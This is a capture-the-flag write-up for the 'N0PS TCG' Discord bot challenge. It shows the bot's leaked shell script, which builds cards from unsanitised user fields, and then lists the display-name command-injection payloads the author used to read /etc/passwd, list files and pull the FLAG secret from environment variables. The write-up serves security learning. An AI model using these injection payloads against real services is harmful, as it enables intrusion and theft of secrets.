Remember Joe Dohn from last year ? He is back with a new concept now: **N0PS TCG**. Try to get in touch with him, he will tell you more about that! I heard he roams around on the Discord server...

# Solve

It appears to be a vulnerable bot.
My teammate found we could dump the source with !devlog

```
#!/bin/bash

#os.popen(f"/app/create_card.sh '{card_class}' '{display_name}' '{discord_tag}' '{', '.join(card_abilities)}' '{profile_picture}' '{id}' '{card_rarity_name}'")

find /tmp -iname *.pdf -delete 2>/dev/null
find /tmp -iname *.html -delete 2>/dev/null

uuid=$(cat /proc/sys/kernel/random/uuid)

cat /app/template.html \
| sed -e "s/card_class/${1}/g" \
| sed -e "s/display_name/${2}/g" \
| sed -e "s/discord_tag/${3}/g" \
| sed -e "s/abilities/${4}/g" \
| sed -e "s/profile_picture/${5}/g" \
| sed -e "s/card_id/${6}/g" \
| sed -e "s/card_rarity/${7}/g" \
> /tmp/$uuid.html

python3 -c "import weasyprint; weasyprint.HTML('/tmp/${uuid}.html').write_pdf('/tmp/${uuid}.pdf')"

pdftoppm -singlefile -jpeg -r 300 /tmp/$uuid.pdf /tmp/$uuid

echo /tmp/$uuid.jpg
```

We have access to the "display_name" variable through changing our display name on discord. After trying a bunch of options I found the following were able to achieve command injection

```
'$(ls)'
'$(cat /etc/passwd)'
```

But it appears to break as it responds with a blank image which means it appears to be breaking the overall script due to the output. After trying a bunch of inputs I got something that actually generated an image.

```
'$(ls | wc -l)'
```

Which counts the files and sets that as our display name. This doesn't contain any special chars and isn't super long so it was able to work.

![](Images/Pasted%20image%2020250531121824.png)

Next we can start outputting the files one by one doing the following

```
'$(ls|head -1)'
```

Which gets us the name of the directory "assets" trying to do it with the first two lines of output breaks it probably due to the new line

![](Images/Pasted%20image%2020250531122137.png)

We can use the following the start grabbing each file

```
'$(ls|head -1)'           # file 1/6
'$(ls|head -2|tail -1)'   # file 2/6
'$(ls|head -3|tail -1)'   # file 3/6
'$(ls|head -4|tail -1)'   # file 4/6
'$(ls|head -5|tail -1)'   # file 5/6
'$(ls|tail -1)'           # file 6/6 (last file)
```


Directory 
- Assets
	- Card1.png
	- CardBG.png
	- Cards
		- CryptoBronze.png
		- Cryptocristal.png
		- Websilver.png
		- Webgold
- Create_card.sh
- devlog.txt
- Main_Py
- requirements.txt
- Template.HTML

```
'$(ls assets| wc -l)'
```

3 objects within assets

```
'$(ls assets|head -1)'           # file 1/6
'$(ls assets|head -2|tail -1)'   # file 2/6
'$(ls assets|head -3|tail -1)'   # file 3/6
```

We find another directory called cards we have to limit our username input to a specific size so we have to use sed instead to print specific lines

```
'$(ls assets/cards|sed -n 1p)'
'$(ls assets/cards|sed -n 2p)'
'$(ls assets/cards|sed -n 3p)'
'$(ls assets/cards|sed -n 4p)'
'$(ls assets/cards|sed -n 5p)'
'$(ls assets/cards|sed -n 6p)'
'$(ls assets/cards|sed -n 7p)'
'$(ls assets/cards|sed -n 8p)'
'$(ls assets/cards|sed -n 9p)'
'$(ls assets/cards|sed -n 10p)'
'$(ls assets/cards|sed -n 11p)'
'$(ls assets/cards|sed -n 12p)'
'$(ls assets/cards|sed -n 13p)'
'$(ls assets/cards|sed -n 14p)'
'$(ls assets/cards|sed -n 15p)'
'$(ls assets/cards|sed -n 16p)'
```

Just appears to be a bunch of image files

Using `'$(basename $(pwd))'` we know that we are within the app directory. After brute forcing I remembered the devlog says the secrets are in the env

![](Images/Pasted%20image%2020250531124159.png)


```
'$(env|grep -c N0PS)'
```

![](Images/Pasted%20image%2020250531124221.png)

This confirms its in the env.

```
'$(env|grep N0PS|cut -d= -f1)'
```

![](Images/Pasted%20image%2020250531124259.png)

The variable name is FLAG now lets just print that

```
'$(echo $FLAG)'
```

![](Images/Pasted%20image%2020250531124330.png)

Which gets our flag

```
N0PS{W0ULD_U_7R4D3_Y0UR_C4RDZ_W1TH_M3?}
```

I was able to be the 4th one to solve this challenge. 